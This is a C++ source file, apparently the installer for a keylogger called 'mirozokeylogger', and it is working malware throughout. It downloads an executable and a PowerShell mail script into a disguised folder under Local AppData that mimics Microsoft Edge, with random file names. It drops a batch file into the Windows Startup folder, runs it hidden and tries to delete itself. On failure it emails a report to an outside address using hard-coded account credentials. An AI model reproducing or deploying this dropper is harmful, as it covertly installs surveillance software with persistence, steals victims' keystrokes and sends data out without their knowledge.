// If installer.ps1 didnt work and installer.bat didnt work maybe installer in cpp will work somehow.
#include <fstream>
#include <Windows.h>
#include <Shlobj.h>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <sstream>

// Path to VCRUNTIME140.DLL
std::string vcruntime_path = "C:\\Windows\\System32\\VCRUNTIME140.DLL";

// Web links to download
std::string kk_url = "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe";
std::string psmail_url = "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1";
std::string hi_url = "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/hi.bat";

// Paths to save downloaded files
std::string kk_path = "";
std::string psmail_path = "";
std::string hi_path = "";

int main() {
	// Check if VCRUNTIME140.DLL exists
	if (std::ifstream(vcruntime_path)) {
		// Get paths to save downloaded files
		char localAppData[MAX_PATH];
		SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
		std::string localAppData_str(localAppData);
		kk_path = localAppData_str + "\\MicrosoftEdge\\404eb8b50ea0d5d6\\ygoLa8SyqmQTGsoh.exe";
		psmail_path = localAppData_str + "\\MicrosoftEdge\\404eb8b50ea0d5d6\\LhFDtKhHgdiXDSt3.ps1";

		char appData[MAX_PATH];
		SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
		std::string appData_str(appData);
		hi_path = appData_str + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.bat";

		// Download and save files
		std::string command = "powershell -command \"Invoke-WebRequest -Uri '" + kk_url + "' -OutFile '" + kk_path + "'\"";
		system(command.c_str());
		command = "powershell -command \"Invoke-WebRequest -Uri '" + psmail_url + "' -OutFile '" + psmail_path + "'\"";
		system(command.c_str());
		command = "powershell -command \"Invoke-WebRequest -Uri '" + hi_url + "' -OutFile '" + hi_path + "'\"";
		system(command.c_str());

		// Execute hi.bat
		std::stringstream ss;
		ss << hi_path;
		std::string hi_path_str = ss.str();
		WinExec(hi_path_str.c_str(), SW_HIDE);

		// Remove File
		remove(__FILE__);
	}
	else {
		// Email credentials
		std::string username = "jankowalski69zs@outlook.com";
		std::string password = "JanKowalski1";
		std::string from = username;
		std::string to = "resultsiliketowatch@op.pl";
		std::string subject = "No file detected.";
		std::string body = "Failed attempt 0x001";

		// Send email
		std::string command = "powershell -command \"Send-MailMessage -SmtpServer 'smtp-mail.outlook.com' -UseSsl -Port 587 -Credential (New-Object System.Management.Automation.PSCredential('" + username + "', (ConvertTo-SecureString '" + password + "' -AsPlainText -Force)) -From '" + from + "' -To '" + to + "' -Subject '" + subject + "' -Body '" + body + "'\"";
		system(command.c_str());

		// Remove File
		remove(__FILE__);
	}

	return 0;
}
